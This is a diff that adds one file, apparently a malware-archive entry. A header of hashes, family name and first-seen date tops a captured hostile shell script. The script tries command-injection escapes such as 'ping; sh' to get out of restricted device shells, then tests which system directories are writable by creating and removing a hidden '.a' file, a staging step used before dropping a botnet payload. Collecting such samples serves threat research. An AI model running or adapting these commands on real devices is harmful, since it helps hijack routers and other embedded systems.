@@ -1,0 +1,23 @@
+# sha256: 6430d2a2338677820d60b9bbb889d2cb308ccd78648ac0ae9d63edd3cc9b784d
+# family: script_generic
+# kind: script
+# size_bytes: 490
+# first_seen: 2026-08-29 04:26:31.093000 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+sh
+shell
+enable
+system
+ping; sh
+mkdir /usr/;>/usr/.a && cd /usr/; rm -rf .a
+mkdir /mnt/;>/mnt/.a && cd /mnt/; rm -rf .a
+mkdir /var/run/;>/var/run/.a && cd /var/run/; rm -rf .a
+mkdir /dev/shm/;>/dev/shm/.a && cd /dev/shm/; rm -rf .a
+mkdir /etc/;>/etc/.a && cd /etc/; rm -rf .a
+mkdir /var/;>/var/.a && cd /var/; rm -rf .a
+mkdir /tmp/;>/tmp/.a && cd /tmp/; rm -rf .a
+mkdir /dev/;>/dev/.a && cd /dev/; rm -rf .a
+mkdir /var/home/user/fw/;>/var/home/user/fw/.a && cd /var/home/user/fw/; rm -rf .a
